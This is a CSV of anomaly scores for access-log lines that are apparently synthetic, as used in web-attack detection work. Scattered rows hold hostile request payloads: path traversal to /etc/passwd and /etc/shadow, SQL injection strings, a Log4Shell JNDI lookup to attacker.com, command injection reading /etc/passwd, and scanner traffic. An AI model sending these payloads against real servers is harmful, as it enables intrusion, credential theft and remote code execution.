score_content,score_session,score_fused,line
16.90113639831543,,16.90113639831543,14.248.74.154 - - [10/Jan/2025:12:00:36 +0000] "GET /search?q=phone HTTP/1.1" 403 1476 "https://example.com/" "curl/7.68.0"
1.5873154401779175,,1.5873154401779175,58.217.28.90 - - [10/Jan/2025:12:00:36 +0000] "GET /api/products HTTP/1.1" 200 15900 "https://example.com/" "python-requests/2.31.0"
7.951961994171143,,7.951961994171143,250.197.210.160 - - [10/Jan/2025:12:00:36 +0000] "GET /api/product?id=123 HTTP/1.1" 304 18481 "https://twitter.com/" "python-requests/2.31.0"
1.699571132659912,,1.699571132659912,180.196.80.236 - - [10/Jan/2025:12:00:36 +0000] "GET /login HTTP/1.1" 200 9054 "https://example.com/" "curl/7.68.0"
0.25534045696258545,,0.25534045696258545,18.37.190.163 - - [10/Jan/2025:12:00:36 +0000] "GET /assets/app.css HTTP/1.1" 200 13232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.83958101272583,,5.83958101272583,41.95.80.185 - - [10/Jan/2025:12:00:41 +0000] "GET /search?q=laptop HTTP/1.1" 200 11270 "https://twitter.com/" "curl/7.68.0"
0.2660108506679535,,0.2660108506679535,173.21.70.114 - - [10/Jan/2025:12:00:45 +0000] "GET /wp-login.php HTTP/1.1" 200 1730 "https://news.ycombinator.com/" "dirb/2.22"
1.7234835624694824,,1.7234835624694824,30.89.111.29 - - [10/Jan/2025:12:00:49 +0000] "GET /login HTTP/1.1" 200 16888 "https://twitter.com/" "curl/7.68.0"
1.6798553466796875,,1.6798553466796875,253.154.15.2 - - [10/Jan/2025:12:00:52 +0000] "GET /logout HTTP/1.1" 200 13051 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6816978454589844,,1.6816978454589844,2.128.192.111 - - [10/Jan/2025:12:00:53 +0000] "GET /login HTTP/1.1" 200 4031 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.85475492477417,,5.85475492477417,19.102.221.190 - - [10/Jan/2025:12:00:56 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11705 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.704663276672363,,12.704663276672363,110.147.104.182 - - [10/Jan/2025:12:00:56 +0000] "GET /about HTTP/1.1" 401 1179 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
569.491455078125,,569.491455078125,206.243.159.118 - - [10/Jan/2025:12:00:58 +0000] "GET /admin HTTP/1.1" 500 351 "-" "sqlmap/1.5.10#stable"
5.859426498413086,,5.859426498413086,135.21.102.223 - - [10/Jan/2025:12:01:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 13221 "https://example.com/" "curl/7.68.0"
0.2450900673866272,,0.2450900673866272,136.131.50.232 - - [10/Jan/2025:12:01:02 +0000] "GET /assets/app.js HTTP/1.1" 200 3836 "https://example.com/" "curl/7.68.0"
0.22698621451854706,,0.22698621451854706,66.51.45.155 - - [10/Jan/2025:12:01:07 +0000] "GET /assets/app.css HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.793263912200928,,5.793263912200928,195.149.115.175 - - [10/Jan/2025:12:01:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 18572 "https://twitter.com/" "python-requests/2.31.0"
1.5556297302246094,,1.5556297302246094,121.114.162.78 - - [10/Jan/2025:12:01:10 +0000] "GET /dashboard HTTP/1.1" 200 2337 "https://twitter.com/" "curl/7.68.0"
1.7179932594299316,,1.7179932594299316,10.15.95.213 - - [10/Jan/2025:12:01:10 +0000] "GET /about HTTP/1.1" 200 14908 "-" "curl/7.68.0"
1.7205383777618408,,1.7205383777618408,99.119.149.142 - - [10/Jan/2025:12:01:15 +0000] "GET /about HTTP/1.1" 201 16715 "-" "sqlmap/1.5.10#stable"
1.586717128753662,,1.586717128753662,129.39.246.16 - - [10/Jan/2025:12:01:18 +0000] "GET /api/products HTTP/1.1" 200 15685 "-" "Wget/1.20.3 (linux-gnu)"
1.6877250671386719,,1.6877250671386719,11.64.182.113 - - [10/Jan/2025:12:01:20 +0000] "GET /about HTTP/1.1" 200 5754 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6366848945617676,,1.6366848945617676,100.105.199.87 - - [10/Jan/2025:12:01:24 +0000] "GET /profile HTTP/1.1" 200 9369 "https://twitter.com/" "sqlmap/1.5.10#stable"
1.5569000244140625,,1.5569000244140625,143.174.99.73 - - [10/Jan/2025:12:01:24 +0000] "GET /dashboard HTTP/1.1" 200 3196 "https://twitter.com/" "curl/7.68.0"
11.333841323852539,,11.333841323852539,248.168.179.170 - - [10/Jan/2025:12:01:25 +0000] "GET /assets/app.css HTTP/1.1" 404 635 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.7106643915176392,,1.7106643915176392,165.203.85.209 - - [10/Jan/2025:12:01:29 +0000] "GET /about HTTP/1.1" 200 12443 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8473310470581055,,5.8473310470581055,93.80.47.244 - - [10/Jan/2025:12:01:29 +0000] "GET /search?q=phone HTTP/1.1" 200 697 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24438028037548065,,0.24438028037548065,217.202.26.130 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 9792 "https://twitter.com/" "python-requests/2.31.0"
0.22789384424686432,,0.22789384424686432,42.47.213.178 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 5154 "https://www.google.com/" "python-requests/2.31.0"
5.848369121551514,,5.848369121551514,249.114.157.73 - - [10/Jan/2025:12:01:37 +0000] "GET /search?q=phone HTTP/1.1" 200 7883 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
569.42626953125,,569.42626953125,232.214.50.95 - - [10/Jan/2025:12:01:38 +0000] "GET /logout HTTP/1.1" 500 960 "https://twitter.com/" "sqlmap/1.5.10#stable"
3.7668607234954834,,3.7668607234954834,136.108.248.42 - - [10/Jan/2025:12:01:41 +0000] "GET /logout HTTP/1.1" 304 16579 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.34473177790641785,,0.34473177790641785,142.240.27.183 - - [10/Jan/2025:12:01:42 +0000] "GET /index.html HTTP/1.1" 201 12263 "-" "python-requests/2.31.0"
0.1423550695180893,,0.1423550695180893,38.213.112.24 - - [10/Jan/2025:12:01:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 16921 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.875377178192139,,5.875377178192139,96.61.99.21 - - [10/Jan/2025:12:01:46 +0000] "GET /search?q=phone HTTP/1.1" 200 16549 "https://www.google.com/" "curl/7.68.0"
12.614704132080078,,12.614704132080078,86.203.38.36 - - [10/Jan/2025:12:01:46 +0000] "GET /contact HTTP/1.1" 400 1331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.317263126373291,,2.317263126373291,115.158.2.232 - - [10/Jan/2025:12:01:49 +0000] "GET /assets/app.css HTTP/1.1" 302 15471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2670823335647583,,0.2670823335647583,109.29.199.74 - - [10/Jan/2025:12:01:51 +0000] "GET /assets/app.css HTTP/1.1" 200 17394 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.493222713470459,,1.493222713470459,17.29.215.232 - - [10/Jan/2025:12:01:51 +0000] "GET /server-status HTTP/1.1" 201 15078 "https://twitter.com/" "nikto/2.5.0"
7.769525051116943,,7.769525051116943,110.1.158.91 - - [10/Jan/2025:12:01:55 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 9644 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.7090195417404175,,1.7090195417404175,18.245.135.140 - - [10/Jan/2025:12:01:58 +0000] "GET /about HTTP/1.1" 200 11916 "https://twitter.com/" "python-requests/2.31.0"
5.976120471954346,,5.976120471954346,252.96.65.192 - - [10/Jan/2025:12:02:02 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 12777 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7190680503845215,,3.7190680503845215,35.12.91.140 - - [10/Jan/2025:12:02:02 +0000] "GET /contact HTTP/1.1" 304 10995 "https://www.google.com/" "curl/7.68.0"
5.746410369873047,,5.746410369873047,17.184.199.242 - - [10/Jan/2025:12:02:07 +0000] "GET /search?q=headphones HTTP/1.1" 201 4518 "-" "Wget/1.20.3 (linux-gnu)"
12.633340835571289,,12.633340835571289,239.80.132.102 - - [10/Jan/2025:12:02:09 +0000] "GET /api/products HTTP/1.1" 403 646 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.6766743659973145,,5.6766743659973145,222.168.85.70 - - [10/Jan/2025:12:02:11 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 1666 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
16.89173698425293,,16.89173698425293,87.250.48.128 - - [10/Jan/2025:12:02:14 +0000] "GET /search?q=camera HTTP/1.1" 403 791 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
3.792264461517334,,3.792264461517334,21.111.155.211 - - [10/Jan/2025:12:02:16 +0000] "GET /login HTTP/1.1" 304 14010 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7020752429962158,,1.7020752429962158,79.115.155.184 - - [10/Jan/2025:12:02:18 +0000] "GET /about HTTP/1.1" 200 9787 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
5.840795993804932,,5.840795993804932,158.112.71.164 - - [10/Jan/2025:12:02:23 +0000] "GET /search?q=camera HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6222611665725708,,1.6222611665725708,244.8.37.218 - - [10/Jan/2025:12:02:28 +0000] "GET /profile HTTP/1.1" 200 5342 "https://news.ycombinator.com/" "python-requests/2.31.0"
7.800039291381836,,7.800039291381836,93.99.244.146 - - [10/Jan/2025:12:02:28 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 12103 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.614284634590149,,1.614284634590149,147.36.136.94 - - [10/Jan/2025:12:02:29 +0000] "GET /profile HTTP/1.1" 200 2619 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.6253718137741089,,1.6253718137741089,128.133.100.234 - - [10/Jan/2025:12:02:34 +0000] "GET /contact HTTP/1.1" 200 6196 "-" "python-requests/2.31.0"
5.833596706390381,,5.833596706390381,178.235.126.52 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 200 9457 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
573.6903076171875,,573.6903076171875,248.217.253.82 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 503 1396 "https://example.com/" "sqlmap/1.5.10#stable"
16.936443328857422,,16.936443328857422,183.182.238.180 - - [10/Jan/2025:12:02:41 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 403 322 "https://example.com/" "curl/7.68.0"
3.6390345096588135,,3.6390345096588135,203.127.7.93 - - [10/Jan/2025:12:02:45 +0000] "GET /api/products HTTP/1.1" 304 7857 "https://twitter.com/" "python-requests/2.31.0"
0.22112098336219788,,0.22112098336219788,17.80.102.184 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 2925 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
16.910032272338867,,16.910032272338867,33.249.82.165 - - [10/Jan/2025:12:02:51 +0000] "GET /search?q=phone HTTP/1.1" 400 151 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.662893295288086,,1.662893295288086,164.151.47.197 - - [10/Jan/2025:12:02:54 +0000] "GET /profile HTTP/1.1" 200 18165 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.318439483642578,,11.318439483642578,40.78.43.42 - - [10/Jan/2025:12:02:58 +0000] "GET /index.html HTTP/1.1" 400 1061 "https://www.google.com/" "curl/7.68.0"
12.668198585510254,,12.668198585510254,51.163.245.142 - - [10/Jan/2025:12:03:00 +0000] "GET /logout HTTP/1.1" 400 513 "https://www.google.com/" "curl/7.68.0"
1.6872553825378418,,1.6872553825378418,152.242.149.40 - - [10/Jan/2025:12:03:05 +0000] "GET /about HTTP/1.1" 200 5625 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.558282852172852,,12.558282852172852,11.212.222.8 - - [10/Jan/2025:12:03:10 +0000] "GET /dashboard HTTP/1.1" 400 1154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.719497561454773,,1.719497561454773,107.159.164.8 - - [10/Jan/2025:12:03:15 +0000] "GET /login HTTP/1.1" 204 18847 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6809260845184326,,1.6809260845184326,77.117.19.177 - - [10/Jan/2025:12:03:17 +0000] "GET /logout HTTP/1.1" 200 13406 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.86398458480835,,5.86398458480835,37.81.221.184 - - [10/Jan/2025:12:03:20 +0000] "GET /search?q=camera HTTP/1.1" 200 19979 "https://example.com/" "curl/7.68.0"
5.7429680824279785,,5.7429680824279785,82.62.120.32 - - [10/Jan/2025:12:03:23 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3579 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.29833707213401794,,0.29833707213401794,222.158.108.64 - - [10/Jan/2025:12:03:24 +0000] "GET /wp-login.php HTTP/1.1" 200 12687 "https://example.com/" "curl/7.68.0"
3.643310308456421,,3.643310308456421,132.120.128.226 - - [10/Jan/2025:12:03:28 +0000] "GET /api/products HTTP/1.1" 302 16427 "https://news.ycombinator.com/" "curl/7.68.0"
0.5165295004844666,,0.5165295004844666,56.150.91.13 - - [10/Jan/2025:12:03:28 +0000] "GET /.env HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.781923294067383,,5.781923294067383,217.28.111.35 - - [10/Jan/2025:12:03:31 +0000] "GET /search?q=headphones HTTP/1.1" 200 367 "https://example.com/" "curl/7.68.0"
5.860295295715332,,5.860295295715332,50.93.142.74 - - [10/Jan/2025:12:03:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 18509 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.679198265075684,,12.679198265075684,175.157.31.33 - - [10/Jan/2025:12:03:38 +0000] "GET /login HTTP/1.1" 400 1276 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5871131420135498,,1.5871131420135498,194.37.51.155 - - [10/Jan/2025:12:03:40 +0000] "GET /dashboard HTTP/1.1" 200 12080 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2930646240711212,,0.2930646240711212,206.122.133.117 - - [10/Jan/2025:12:03:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11013 "https://twitter.com/" "curl/7.68.0"
5.8162689208984375,,5.8162689208984375,152.87.130.213 - - [10/Jan/2025:12:03:48 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9905 "https://twitter.com/" "nikto/2.5.0"
1.8646620512008667,,1.8646620512008667,251.107.150.79 - - [10/Jan/2025:12:03:50 +0000] "GET / HTTP/1.1" 200 3691 "-" "sqlmap/1.5.10#stable"
7.931307792663574,,7.931307792663574,123.44.135.162 - - [10/Jan/2025:12:03:54 +0000] "GET /api/product?id=123 HTTP/1.1" 302 19220 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.693299770355225,,5.693299770355225,49.5.113.81 - - [10/Jan/2025:12:03:57 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3701 "https://www.google.com/" "dirb/2.22"
5.872636795043945,,5.872636795043945,224.218.189.187 - - [10/Jan/2025:12:04:00 +0000] "GET /search?q=phone HTTP/1.1" 200 15553 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
569.44921875,,569.44921875,135.97.81.245 - - [10/Jan/2025:12:04:04 +0000] "GET /dashboard HTTP/1.1" 503 979 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.677988290786743,,3.677988290786743,157.124.50.246 - - [10/Jan/2025:12:04:08 +0000] "GET /profile HTTP/1.1" 301 8762 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.736199140548706,,3.736199140548706,177.181.126.82 - - [10/Jan/2025:12:04:12 +0000] "GET /logout HTTP/1.1" 304 6892 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.7287192344665527,,1.7287192344665527,174.140.98.230 - - [10/Jan/2025:12:04:16 +0000] "GET /login HTTP/1.1" 200 18891 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
13.482732772827148,,13.482732772827148,89.237.114.168 - - [10/Jan/2025:12:04:17 +0000] "GET /logout HTTP/1.1" 429 161 "https://news.ycombinator.com/" "curl/7.68.0"
12.775973320007324,,12.775973320007324,70.36.28.158 - - [10/Jan/2025:12:04:18 +0000] "GET /login HTTP/1.1" 404 1425 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.822845458984375,,5.822845458984375,26.106.85.184 - - [10/Jan/2025:12:04:19 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1820 "-" "Wget/1.20.3 (linux-gnu)"
569.6798706054688,,569.6798706054688,105.168.240.226 - - [10/Jan/2025:12:04:24 +0000] "GET / HTTP/1.1" 500 323 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.6455169916152954,,1.6455169916152954,233.197.23.167 - - [10/Jan/2025:12:04:29 +0000] "GET /logout HTTP/1.1" 200 2038 "https://www.google.com/" "python-requests/2.31.0"
11.4491605758667,,11.4491605758667,107.226.215.46 - - [10/Jan/2025:12:04:33 +0000] "GET /index.html HTTP/1.1" 404 358 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.977834701538086,,12.977834701538086,77.146.155.28 - - [10/Jan/2025:12:04:36 +0000] "GET /logout HTTP/1.1" 403 18 "https://example.com/" "curl/7.68.0"
16.863136291503906,,16.863136291503906,218.130.120.70 - - [10/Jan/2025:12:04:39 +0000] "GET /search?q=headphones HTTP/1.1" 403 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.812987327575684,,5.812987327575684,4.189.87.203 - - [10/Jan/2025:12:04:41 +0000] "GET /search?q=camera HTTP/1.1" 204 6201 "https://twitter.com/" "curl/7.68.0"
0.27744239568710327,,0.27744239568710327,212.110.132.84 - - [10/Jan/2025:12:04:46 +0000] "GET /assets/app.js HTTP/1.1" 200 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.19984611868858337,,0.19984611868858337,2.67.99.61 - - [10/Jan/2025:12:04:51 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8228 "https://example.com/" "nikto/2.5.0"
1.8929110765457153,,1.8929110765457153,178.61.16.171 - - [10/Jan/2025:12:04:53 +0000] "GET / HTTP/1.1" 200 11881 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7126893997192383,,3.7126893997192383,95.158.57.57 - - [10/Jan/2025:12:04:55 +0000] "GET /logout HTTP/1.1" 301 9767 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6627167463302612,,1.6627167463302612,234.121.194.138 - - [10/Jan/2025:12:04:56 +0000] "GET /profile HTTP/1.1" 200 18097 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.7248691320419312,,1.7248691320419312,181.93.20.235 - - [10/Jan/2025:12:04:57 +0000] "GET /about HTTP/1.1" 200 17407 "-" "python-requests/2.31.0"
1.551543116569519,,1.551543116569519,43.84.219.134 - - [10/Jan/2025:12:04:57 +0000] "GET /api/products HTTP/1.1" 200 5010 "-" "Wget/1.20.3 (linux-gnu)"
5.788679122924805,,5.788679122924805,115.208.15.117 - - [10/Jan/2025:12:05:02 +0000] "GET /search?q=headphones HTTP/1.1" 200 16823 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.340555876493454,,0.340555876493454,186.6.102.66 - - [10/Jan/2025:12:05:05 +0000] "GET /index.html HTTP/1.1" 200 10198 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.455290675163269,,1.455290675163269,139.16.240.229 - - [10/Jan/2025:12:05:09 +0000] "GET /server-status HTTP/1.1" 200 2189 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.356818914413452,,2.356818914413452,96.229.98.115 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.js HTTP/1.1" 304 13874 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.2409171611070633,,0.2409171611070633,31.46.138.101 - - [10/Jan/2025:12:05:09 +0000] "GET /assets/app.css HTTP/1.1" 204 11495 "https://www.google.com/" "python-requests/2.31.0"
